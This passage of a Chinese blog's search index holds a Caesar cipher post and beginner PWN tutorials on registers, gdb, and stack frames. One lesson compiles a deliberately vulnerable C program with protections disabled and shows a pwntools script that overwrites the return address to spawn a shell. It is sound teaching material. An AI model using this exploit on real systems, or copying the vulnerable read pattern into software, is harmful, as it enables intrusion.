class=\"line\">\t\t\t</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%c&quot;</span>, a[i]);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span> </span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tadd(<span class=\"number\">1</span>);</span><br><span class=\"line\">\tsystem(<span class=\"string\">&quot;pause&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></div></figure>\n<p>运行结果:<br><img src=\"/2023/04/22/kaisa/c.png\" alt=\"C\"></p>\n<p>python代码实现</p>\n<figure class=\"highlight python\"><div class=\"table-container\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding = utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># @Time : 2022/5/8 22:04</span></span><br><span class=\"line\"><span class=\"comment\"># @Author : 乙太</span></span><br><span class=\"line\"><span class=\"comment\"># @file : 凯撒加密.py</span></span><br><span class=\"line\"><span class=\"comment\"># @Software: PyCharm</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">str</span> = <span class=\"built_in\">input</span>(<span class=\"string\">&quot;输入密文：\\n&quot;</span>)</span><br><span class=\"line\">b = <span class=\"built_in\">int</span>(<span class=\"built_in\">input</span>(<span class=\"string\">&quot;输入密钥：\\n&quot;</span>))</span><br><span class=\"line\">flag=<span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span> (<span class=\"built_in\">len</span>(<span class=\"built_in\">str</span>)):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"built_in\">ord</span>(<span class=\"built_in\">str</span>[i]) &gt;= <span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;a&#x27;</span>) <span class=\"keyword\">and</span> <span class=\"built_in\">ord</span>(<span class=\"built_in\">str</span>[i]) &lt;= <span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;z&#x27;</span>)) <span class=\"keyword\">or</span> (<span class=\"built_in\">ord</span>(<span class=\"built_in\">str</span>[i]) &gt;= <span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;A&#x27;</span>) <span class=\"keyword\">and</span> <span class=\"built_in\">ord</span>(<span class=\"built_in\">str</span>[<span class=\"number\">1</span>]) &lt;= <span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;Z&#x27;</span>)):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ((<span class=\"built_in\">ord</span>(<span class=\"built_in\">str</span>[i]) &gt;= (<span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;Z&#x27;</span>) - b + <span class=\"number\">1</span>) <span class=\"keyword\">and</span> <span class=\"built_in\">ord</span>(<span class=\"built_in\">str</span>[i]) &lt;= <span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;Z&#x27;</span>)) <span class=\"keyword\">or</span> (<span class=\"built_in\">ord</span>(<span class=\"built_in\">str</span>[i]) &gt;= (<span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;z&#x27;</span>) - b + <span class=\"number\">1</span>) <span class=\"keyword\">and</span> <span class=\"built_in\">ord</span>(<span class=\"built_in\">str</span>[i]) &lt;= <span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;z&#x27;</span>))):</span><br><span class=\"line\">            flag += <span class=\"built_in\">chr</span>(<span class=\"built_in\">ord</span>(<span class=\"built_in\">str</span>[i]) - (<span class=\"number\">26</span> - b))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">           flag += <span class=\"built_in\">chr</span>(<span class=\"built_in\">ord</span>(<span class=\"built_in\">str</span>[i]) + b)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        flag += <span class=\"built_in\">str</span>[i]</span><br><span class=\"line\"><span class=\"built_in\">print</span>(flag)</span><br></pre></td></tr></table></div></figure>\n<p>运行结果:<br><img src=\"/2023/04/22/kaisa/py.png\" alt=\"py\"></p>\n","categories":["密码学","恺撒密码"],"tags":["密码学","恺撒密码"]},{"title":"01. PWN基础知识","url":"/2022/10/26/pwn001/","content":"\n        <h1 id=\"一-什么是溢出？\">\n          <a href=\"#一-什么是溢出？\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#一-什么是溢出？\" class=\"headerlink\" title=\"一.什么是溢出？\"></a>一.什么是溢出？</h1>\n      <p>1.概念：在计算机中，当要表示的数据超出计算机所使用的数据的表示范围时，则产生数据溢出</p>\n<p>2.产生的原因：<br>  *使用非安全类型（non -type-safe)的语言如C&#x2F;C++等<br>  *以不可靠的方式存取或者复制内存缓冲区<br>  *编译器设置的内存缓冲区太靠近关键数据结构；</p>\n\n        <h1 id=\"二-什么是PWN？\">\n          <a href=\"#二-什么是PWN？\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#二-什么是PWN？\" class=\"headerlink\" title=\"二.什么是PWN？\"></a>二.什么是PWN？</h1>\n      <p>概念：<br>          在计算机中，当要表示的数据超出计算机所使用的数据表示范围时，则产生数据的溢出。<br>        “pwn”是一个黑客语法的俚语词，是指攻破设备或者系统。发音类似“砰”，对于黑客而言，这就是成功实施黑客攻击的声音—-砰的一声，被“黑”的电脑或手机就被操控。</p>\n\n        <h1 id=\"三-复习寄存器\">\n          <a href=\"#三-复习寄存器\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#三-复习寄存器\" class=\"headerlink\" title=\"三.复习寄存器\"></a>三.复习寄存器</h1>\n      <p>ESP: 用来储存函数调用得的栈顶指针，在压栈和退栈时发生变化<br>EBP: 用来存储当前函数状态的基地址，在函数运行时不变，可以用来索引确定函数参数或局部变量的位置<br>EIP: 用来储存即将执行的程序指令的地址</p>\n\n        <h1 id=\"四-复习汇编\">\n          <a href=\"#四-复习汇编\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#四-复习汇编\" class=\"headerlink\" title=\"四.复习汇编\"></a>四.复习汇编</h1>\n      <p>  *32位x86架构下汇编指令有两种格式intel与AT&amp;T<br>  *Intel：寄存器名称和数值前无符号     AT&amp;T：寄存器名称前加”%“，数值前加”$”<br>  *在.gdbinit配置文件中可以配置：set disassembly-flavor intel</p>\n\n        <h1 id=\"五-栈帧\">\n          <a href=\"#五-栈帧\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#五-栈帧\" class=\"headerlink\" title=\"五.栈帧\"></a>五.栈帧</h1>\n      <p>栈帧就是一个函数执行的环境：函数参数、局部变量、函数执行后返回到哪里等等。每一个栈帧代表的就是一个未执行完的函数</p>\n<pre><code>    ps: [ebp - xx]一般都是局部变量\n        [ebp + xx]一般都是参数\n</code></pre>\n\n        <h1 id=\"六-分析函数执行时堆栈变化\">\n          <a href=\"#六-分析函数执行时堆栈变化\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#六-分析函数执行时堆栈变化\" class=\"headerlink\" title=\"六.分析函数执行时堆栈变化\"></a>六.分析函数执行时堆栈变化</h1>\n      \n        <h2 id=\"1-在linux的控制台编译C文件\">\n          <a href=\"#1-在linux的控制台编译C文件\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#1-在linux的控制台编译C文件\" class=\"headerlink\" title=\"1. 在linux的控制台编译C文件\"></a>1. 在linux的控制台编译C文件</h2>\n      <p>要求：熟悉Linux常用命令和Vi编辑器</p>\n<p>首先进入root用户模式 sudo su：<br><img src=\"/2022/10/26/pwn001/pwn1.png\" alt=\"图片\"><br>ls 命令 显示文件目录：<br><img src=\"/2022/10/26/pwn001/pwn2.png\" alt=\"图片\"><br>命令cd  切换到指定目录：</p>\n<figure class=\"highlight plaintext\"><div class=\"table-container\"><table><tr><td class=\"code\"><pre><span class=\"line\">cd 桌面</span><br></pre></td></tr></table></div></figure>\n<p>命令mkdir 创建目录：</p>\n<figure class=\"highlight plaintext\"><div class=\"table-container\"><table><tr><td class=\"code\"><pre><span class=\"line\">mkdir PWN</span><br></pre></td></tr></table></div></figure>\n<p>命令chmod 修改文件或目录权限：</p>\n<figure class=\"highlight plaintext\"><div class=\"table-container\"><table><tr><td class=\"code\"><pre><span class=\"line\">chmod 777             //最高权限</span><br></pre></td></tr></table></div></figure>\n<p>命令touch 创建相关文件：</p>\n<figure class=\"highlight plaintext\"><div class=\"table-container\"><table><tr><td class=\"code\"><pre><span class=\"line\">touch heilo.c</span><br></pre></td></tr></table></div></figure>\n<p>进入Vi编辑器打开文本：</p>\n<figure class=\"highlight plaintext\"><div class=\"table-container\"><table><tr><td class=\"code\"><pre><span class=\"line\">vi hello.c</span><br></pre></td></tr></table></div></figure>\n<p>之后按下 i 才能进行编辑，输入以下代码：</p>\n<figure class=\"highlight c\"><div class=\"table-container\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">test</span><span class=\"params\">(<span class=\"type\">int</span> a,<span class=\"type\">int</span> b)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> c=a+b;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> c;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> d=test(<span class=\"number\">1</span>,<span class=\"number\">2</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></div></figure>\n\n<p>然后按Esc后输入 :wq 才能保存并且退出！</p>\n<p>命令gcc 编译.c文件：</p>\n<figure class=\"highlight plaintext\"><div class=\"table-container\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">gcc -m32 -o hello hello.c</span><br></pre></td></tr></table></div></figure>\n\n\n        <h2 id=\"2-运行gdb\">\n          <a href=\"#2-运行gdb\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#2-运行gdb\" class=\"headerlink\" title=\"2. 运行gdb\"></a>2. 运行gdb</h2>\n      <figure class=\"highlight plaintext\"><div class=\"table-container\"><table><tr><td class=\"code\"><pre><span class=\"line\">gdb hello </span><br></pre></td></tr></table></div></figure>\n<p><img src=\"/2022/10/26/pwn001/pwn3.png\" alt=\"图片\"></p>\n<figure class=\"highlight plaintext\"><div class=\"table-container\"><table><tr><td class=\"code\"><pre><span class=\"line\">disass main          反汇编查看main函数</span><br></pre></td></tr></table></div></figure>\n<p><img src=\"/2022/10/26/pwn001/pwn4.png\" alt=\"图片\"></p>\n<figure class=\"highlight plaintext\"><div class=\"table-container\"><table><tr><td class=\"code\"><pre><span class=\"line\">disass test                                                           查看test函数</span><br></pre></td></tr></table></div></figure>\n<p><img src=\"/2022/10/26/pwn001/pwn5.png\" alt=\"图片\"></p>\n<figure class=\"highlight plaintext\"><div class=\"table-container\"><table><tr><td class=\"code\"><pre><span class=\"line\">b *0x565554ed                                          加断点 </span><br></pre></td></tr></table></div></figure>\n<p><img src=\"/2022/10/26/pwn001/pwn6.png\" alt=\"图片\"></p>\n<figure class=\"highlight plaintext\"><div class=\"table-container\"><table><tr><td class=\"code\"><pre><span class=\"line\">run                                                              运行</span><br><span class=\"line\">r是运行</span><br><span class=\"line\">n是单步执行，next遇到函数不会进入函数内部</span><br><span class=\"line\">si是步入，step会执行到函数内部c是继续运行，调试时，使用continue命令继续执行程序。程序遇到断电后再次暂停执行；</span><br><span class=\"line\">如果没有断点，就会一直执行到结束</span><br></pre></td></tr></table></div></figure>\n<p><img src=\"/2022/10/26/pwn001/pwn7.png\" alt=\"图片\"><br>这里即使到了我们的断点。</p>\n<p>然后按 n 单步执行，注意观察堆栈变化：<br>push ebp就是把寄存器ebp的值，也就是ebp的地址压入堆栈中<br><img src=\"/2022/10/26/pwn001/pwn8.png\" alt=\"图片\"></p>\n<p>mov ebp，esp就是把esp的地址传给epd，因ebp会上移动到esp所在的位置<br><img src=\"/2022/10/26/pwn001/pwn9.png\" alt=\"图片\"></p>\n<p>sub esp，0x10就是把esp的地址减去了16字节，外观上看就是把esp上移了4行<br><img src=\"/2022/10/26/pwn001/pwn10.png\" alt=\"图片\"></p>\n<p>call   __x86.get_pc_thunk.ax   这个就先不管啦<br>add    eax, 0x1ae4 也是先不管</p>\n<p>mov    edx, dword ptr [ebp + 8] 这个其实就是esp寻址，把参数1放到edx<br>mov    eax, dword ptr [ebp + 0xc]   这个其实也是，把参数2放到eax<br>此时看的该是寄存器：<br><img src=\"/2022/10/26/pwn001/pwn11.png\" alt=\"图片\"></p>\n<p>add    eax, edx       把edx的值和eax相加后保存到eax<br><img src=\"/2022/10/26/pwn001/pwn12.png\" alt=\"图片\"></p>\n<p>此时堆栈都还没发生变化，主要是在实现函数的主要功能</p>\n<p>mov    dword ptr [ebp - 4], eax    就是把eax存储的最后计算结果转存到堆栈中<br><img src=\"/2022/10/26/pwn001/pwn13.png\" alt=\"图片\"></p>\n<p>mov    eax, dword ptr [ebp - 4]   又把计算结果返回给EAX</p>\n<figure class=\"highlight plaintext\"><div class=\"table-container\"><table><tr><td class=\"code\"><pre><span class=\"line\">leave是汇编语言中用来关闭栈帧的指令名，通常用于函数末尾</span><br><span class=\"line\">在16位汇编下相当于:</span><br><span class=\"line\">mov sp,bp</span><br><span class=\"line\">pop bp</span><br><span class=\"line\"> </span><br><span class=\"line\">在32位汇编下相当于:</span><br><span class=\"line\">mov esp,ebp;</span><br><span class=\"line\">//将ebp指向（ebp内部应当保存一个地址，所谓指向即这个地址对应的空间）的值赋给esp</span><br><span class=\"line\">pop ebp </span><br><span class=\"line\"> </span><br><span class=\"line\">/* leave指令将EBP寄存器的内容复制到ESP寄存器中，</span><br><span class=\"line\">以释放分配给该过程的所有堆栈空间。然后，它从堆栈恢复EBP寄存器的旧值。*/</span><br><span class=\"line\">enter有时在函数开头，正好相反,相当于：</span><br><span class=\"line\">push ebp</span><br><span class=\"line\">mov ebp,esp</span><br><span class=\"line\"></span><br></pre></td></tr></table></div></figure>\n\n<p><img src=\"/2022/10/26/pwn001/pwn14.png\" alt=\"图片\"><br>ret 返回，把当前栈顶的值放入EIP，并且使栈顶指针加地址4默认，可以看到上面，esp储存的就是main函数内存地址<br>代码块跳转变化：<br><img src=\"/2022/10/26/pwn001/pwn15.png\" alt=\"图片\"></p>\n<p>堆栈变化：<br><img src=\"/2022/10/26/pwn001/pwn16.png\" alt=\"图片\"></p>\n<p>add    esp, 8   平衡堆栈，esp+8，就是esp地址下移动8字节，两行<br><img src=\"/2022/10/26/pwn001/pwn17.png\" alt=\"图片\"></p>\n<p>mov    dword ptr [ebp - 4], eax   又是把eax的数据转存到堆栈<br>mov    eax, 0    把eax清零<br>leave<br><img src=\"/2022/10/26/pwn001/pwn18.png\" alt=\"图片\"></p>\n<p>ret 从main函数再返回就到结束阶段了，后面不解释<br><img src=\"/2022/10/26/pwn001/pwn19.png\" alt=\"图片\"></p>\n<p>delete     最后删除所有断点 </p>\n<figure class=\"highlight plaintext\"><div class=\"table-container\"><table><tr><td class=\"code\"><pre><span class=\"line\">掌握函数调用的流程，以及函数调用约定，</span><br><span class=\"line\">就像今天的例子压入1，2，3，用高级语言进行汇编，所以压入栈内就是321了，</span><br><span class=\"line\">了解栈的特性：先进后出。栈的生长方向 ，堆栈平衡的操作。</span><br><span class=\"line\">要继续熟悉掌握汇编语言，会看x86的汇编指令，了解eflag标志寄存器的变化。</span><br><span class=\"line\">了解掌握gdb调试（pwndbg，peda）的使用，和相关指令。</span><br></pre></td></tr></table></div></figure>","categories":["PWN","01 PWN基础知识"],"tags":["PWN","01 PWN基础知识"]},{"title":"02. 保护概念和栈溢出实例","url":"/2022/11/08/pwn002/","content":"\n        <h1 id=\"一-常见的保护\">\n          <a href=\"#一-常见的保护\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#一-常见的保护\" class=\"headerlink\" title=\"一.常见的保护\"></a>一.常见的保护</h1>\n      <pre><code>操作系统提供了许多安全机制来尝试降低或阻止缓冲区溢出攻击带来的安全风险，包括DEP、ASLR等。在编写漏洞利用代码的时候，需要特别注意目标进程是否开启了DEP（Linux下对应NX）、ASLR(Linux下对应PIE)等机制，例如存在DEP(NX)的话就不能执行栈上地数据，存在ASLR的话各个系统调用的就是随机变化的。\n</code></pre>\n<ol>\n<li>CANARY (栈保护)<br>  这个选项表示栈保护功能是否开启</li>\n</ol>\n<pre><code>栈溢出保护是一种缓冲区溢出攻击缓冲手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shsellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就会停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。\n</code></pre>\n<ol start=\"2\">\n<li><p>FORTIFY<br> 也是防止缓冲区溢出攻击，新颖少见</p>\n</li>\n<li><p>NX（DEP）<br> NX即No-eXecute（不可执行），基本原理即将数据所在内存页标识为不可执行·，当程序溢出成功转入shellocode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</p>\n</li>\n<li><p>PIE（ASLR）<br> 一般情况下NX（Windows上称为DEP）和地址空间分布随机化（ASLR）会同时工作。<br> 内存地址随机化机制（address sapace layout randomizatuion）,有以下三种情况<br>0–表示关闭进程地址空间随机变化<br>1–表示将mmap的基址，stack和vdso页面随机变化<br>2–表示在1的基础上增加栈（heap）的随机变<br> 可以防范基于Ret21ibc方式的针对DEP的攻击。ASLR和DEP配合使用，能有效阻止攻击者在堆栈上运行恶意代码。</p>\n</li>\n</ol>\n<p>5.RELPO<br>    设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。RELRO为“Partial RELRO”, 说明我们对GOT表具有写权限。</p>\n<hr>\n\n        <h1 id=\"二-Linux检查保护情况\">\n          <a href=\"#二-Linux检查保护情况\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#二-Linux检查保护情况\" class=\"headerlink\" title=\"二. Linux检查保护情况\"></a>二. Linux检查保护情况</h1>\n      <p>命令：checksec 文件名<br>注意：要以root权限执行<br>要在该文件目录下执行：</p>\n<p><img src=\"/2022/11/08/pwn002/pwn01.png\" alt=\"图片\"></p>\n<p>解读查询结构：i386架构，32位，little是小端存储<br>partial RELR0<br>Carry found<br>NX enabled<br>以上开启了三种保护<br>NO PIE 没开启地址随机变换</p>\n<hr>\n\n        <h1 id=\"三-关闭保护\">\n          <a href=\"#三-关闭保护\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#三-关闭保护\" class=\"headerlink\" title=\"三. 关闭保护\"></a>三. 关闭保护</h1>\n      <figure class=\"highlight plaintext\"><div class=\"table-container\"><table><tr><td class=\"code\"><pre><span class=\"line\">命令：gcc -no-pie -fno-stack-protector -z execstack -m32 -o read read.c</span><br></pre></td></tr></table></div></figure>\n<p>再查看：</p>\n<p><img src=\"/2022/11/08/pwn002/pwn02.png\" alt=\"图片\"></p>\n<hr>\n\n        <h1 id=\"四-查看程序使用了哪些函数\">\n          <a href=\"#四-查看程序使用了哪些函数\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#四-查看程序使用了哪些函数\" class=\"headerlink\" title=\"四. 查看程序使用了哪些函数\"></a>四. 查看程序使用了哪些函数</h1>\n      <p>命令：objdump 是查看目标文件或者可执行的目标文件的构成的gcc工具。<br>详情：<span class=\"exturl\"><a class=\"exturl__link\" href=\"https://man.linuxde.net/objdump\">https://man.linuxde.net/objdump</a><span class=\"exturl__icon\"><i class=\"fas fa-external-link-alt\"></i></span></span></p>\n<figure class=\"highlight c\"><div class=\"table-container\"><table><tr><td class=\"code\"><pre><span class=\"line\">-j name    仅仅显示指定名称为name的section的信息</span><br><span class=\"line\">-t              显示文件的符号表入口</span><br><span class=\"line\">objdump -t -j .text read                 <span class=\"comment\">//查看已经编译的read程序的.text段有哪些函数</span></span><br></pre></td></tr></table></div></figure>\n<p><img src=\"/2022/11/08/pwn002/pwn03.png\" alt=\"图片\"></p>\n<hr>\n\n        <h1 id=\"五-实战演练\">\n          <a href=\"#五-实战演练\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#五-实战演练\" class=\"headerlink\" title=\"五. 实战演练\"></a>五. 实战演练</h1>\n      \n        <h2 id=\"1-源码\">\n          <a href=\"#1-源码\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#1-源码\" class=\"headerlink\" title=\"1. 源码\"></a>1. 源码</h2>\n      <p>首先用上一次的方法，编写一个 .c 文件，源代码：</p>\n<figure class=\"highlight c\"><div class=\"table-container\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">exploit</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    system(<span class=\"string\">&quot;/bin/sh&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">func</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">char</span> str[<span class=\"number\">0x20</span>];</span><br><span class=\"line\">    read(<span class=\"number\">0</span>, str, <span class=\"number\">0x50</span>);             </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    func();</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></div></figure>\n<p>然后编译，同时也需要关闭保护，然后查看保护，如上命令！</p>\n<figure class=\"highlight plaintext\"><div class=\"table-container\"><table><tr><td class=\"code\"><pre><span class=\"line\">记得权限：chmod 777 read</span><br></pre></td></tr></table></div></figure>\n<p>可见函数func()里面实现的功能就是可以从command line读取0x50的字符串，放入空间为0x20的字符串数组，显然会超出范围，就会发生堆栈溢出!</p>\n<hr>\n\n        <h2 id=\"2-函数解释：\">\n          <a href=\"#2-函数解释：\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#2-函数解释：\" class=\"headerlink\" title=\"2. 函数解释：\"></a>2. 函数解释：</h2>\n      <p>** read()               用于将文件描述符对应的文件中读取数据 **</p>\n<figure class=\"highlight c\"><div class=\"table-container\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">ssize_t</span> <span class=\"title function_\">read</span><span class=\"params\">(<span class=\"type\">int</span> fd,<span class=\"type\">void</span>*buf,<span class=\"type\">size_t</span> count)</span></span><br><span class=\"line\">参数说明：</span><br><span class=\"line\">fd: 是文件描述符, 从command line获取数据时，为0</span><br><span class=\"line\">buf: 为读出数据的缓冲区；</span><br><span class=\"line\">count: 为每次读取的字节数（是请求读取的字节数，读上来的数据保</span><br><span class=\"line\">存在缓冲区buf中，同时文件的当前读写位置向后移）</span><br><span class=\"line\">返回值：</span><br><span class=\"line\">成功：返回读出的字节数</span><br><span class=\"line\">失败：返回-1，并设置errno，如果在调用read</span><br><span class=\"line\">之前到达文件末尾，则这次read返回0</span><br></pre></td></tr></table></div></figure>\n\n\n<p>** write()             用于将数据写入到文件描述符对应的文件，原型：**</p>\n<figure class=\"highlight c\"><div class=\"table-container\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">ssize_t</span> <span class=\"title function_\">write</span><span class=\"params\">(<span class=\"type\">int</span> fd,<span class=\"type\">const</span> <span class=\"type\">void</span>*buf,<span class=\"type\">size_t</span> count)</span>;</span><br><span class=\"line\">参数说明：</span><br><span class=\"line\">fd:是文件描述符（输出到command line，就是<span class=\"number\">1</span>）</span><br><span class=\"line\">buf:通常是一个字符串，需要写入的字符串</span><br><span class=\"line\">count：是每次写入的字节数</span><br></pre></td></tr></table></div></figure>\n<p>** 返回值：**</p>\n<figure class=\"highlight plaintext\"><div class=\"table-container\"><table><tr><td class=\"code\"><pre><span class=\"line\">成功：返回写入的字节数</span><br><span class=\"line\">失败：返回-1并设置errno</span><br><span class=\"line\">ps： 写常规文件时，write的返回值通常等于请求写的字节</span><br><span class=\"line\">数count， 而向终端设备或者网络写时则不一定</span><br></pre></td></tr></table></div></figure>\n<p>command line相当于windows控制台窗口！</p>\n<hr>\n\n        <h2 id=\"3-查看程序段函数：\">\n          <a href=\"#3-查看程序段函数：\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#3-查看程序段函数：\" class=\"headerlink\" title=\"3.查看程序段函数：\"></a>3.查看程序段函数：</h2>\n      <p> <img src=\"/2022/11/08/pwn002/pwn04.png\" alt=\"图片\"><br>可见这里对应了源代码的程序，一目了然。这种方式只是适合简单程序查看，复杂的还是使用IDA</p>\n<p>分析：<br>这里我们就重点关注func()的汇编代码：<br>gdb read        &#x2F;&#x2F;运行gdb<br>disass func       &#x2F;&#x2F;查看汇编代码</p>\n<p>前两+0和+1行生成栈帧，巩固leave 和 enter</p>\n<figure class=\"highlight plaintext\"><div class=\"table-container\"><table><tr><td class=\"code\"><pre><span class=\"line\">enter有时在函数开头，正好相反,相当于：</span><br><span class=\"line\">push ebp</span><br><span class=\"line\">mov ebp,esp</span><br></pre></td></tr></table></div></figure>\n<p>+3行保存当前的ebp地址<br>+4行减小0x24申请36字节的空间，也就esp上升9行<br>+7和+12是调试器自动加的获取动态地址，不在程序内，先不管<br>+17再在堆栈申请4个字节空间，减小0x4，esp上升一行<br>+20把read()函数的第三个参数0x50压栈<br>+22把ebp-0x28的地址保存到edx<br>+25把ebp的值压栈，也就是把ebp-0x28的地址压栈。很有可能是一个结构体<br>+26把read函数第一个参数0x0压栈<br>&#x2F;&#x2F;为什么参数会从右向左压栈？因为C语言函数调用约定_cdecl<br>+30和+35就是调用read()函数了，和外平栈<br>后面就是恢复了</p>\n<p>看堆栈图：</p>\n<div class=\"table-container\"><table>\n<thead>\n<tr>\n<th>堆栈地址</th>\n<th>堆栈数据</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>0x28这里代表十行省略</td>\n<td>数据</td>\n</tr>\n</tbody></table></div>\n<pre><code>|保存原ebp地址\n</code></pre>\n<p>ret    |保存返回地址数据</p>\n<p>如果程序要执行exploit函数，那么要把这个函数的入口地址覆盖保存到ret</p>\n<p>所以我们首先要找下exploit()函数的入口地址：disass exploit<br> <img src=\"/2022/11/08/pwn002/pwn05.png\" alt=\"图片\"><br>0x08048456</p>\n<hr>\n\n        <h2 id=\"4-写exp\">\n          <a href=\"#4-写exp\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#4-写exp\" class=\"headerlink\" title=\"4.写exp:\"></a>4.写exp:</h2>\n      <p>老方法，用vi编辑器：vi exp.py</p>\n<p>代码内容：</p>\n<figure class=\"highlight python\"><div class=\"table-container\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *    <span class=\"comment\">#导入pwn包</span></span><br><span class=\"line\">p=process(<span class=\"string\">&quot;./read&quot;</span>)    <span class=\"comment\">#指定目录创建进程</span></span><br><span class=\"line\">offset = <span class=\"number\">0x28</span> + <span class=\"number\">0x4</span>    <span class=\"comment\">#设置偏移量</span></span><br><span class=\"line\">payload = <span class=\"string\">&#x27;a&#x27;</span>*offset + p32(<span class=\"number\">0x08048456</span>)</span><br><span class=\"line\"><span class=\"comment\">#用垃圾值a填充覆盖堆栈中offset行的数据,用32位的地址数据覆盖ret</span></span><br><span class=\"line\">p.sendline(payload)     <span class=\"comment\">#发送数据</span></span><br><span class=\"line\">p.interactive()       <span class=\"comment\">#获取运行时的环境</span></span><br></pre></td></tr></table></div></figure>\n<figure class=\"highlight plaintext\"><div class=\"table-container\"><table><tr><td class=\"code\"><pre><span class=\"line\">保存    Esc  :wq </span><br><span class=\"line\">权限：chmod 777 exp.py</span><br><span class=\"line\">运行：python exp.py</span><br></pre></td></tr></table></div></figure>\n<p> <img src=\"/2022/11/08/pwn002/pwn06.png\" alt=\"图片\"><br>可以看到$符号，所以我们就到了shell环境下！</p>\n<p>然后我们就可以查看系统里面的东西了：<br> <img src=\"/2022/11/08/pwn002/pwn07.png\" alt=\"图片\"></p>\n<p>but？？？我要怎么退出这个环境啊？<br>CTRL+C就退出了</p>\n","categories":["PWN","02 PWN基础知识"],"tags":["PWN","02 PWN基础知识"]},{"title":"03. 远程PWN","url":"/2023/02/20/pwn003/","content":"<img src=\"https://ghchart.rshah.org/409ba5/unique-Elven\" alt=\"unqique-Elven's Blue Github Chart\">\n远程例题：\n还是上一节课的read\n在学逆向论坛，找到pwn-02\n开启动态靶机，注意靶机地址：\n\n<p><img src=\"/2023/02/20/pwn003/1.png\" alt=\"图片\"><br><img src=\"/2023/02/20/pwn003/2.png\" 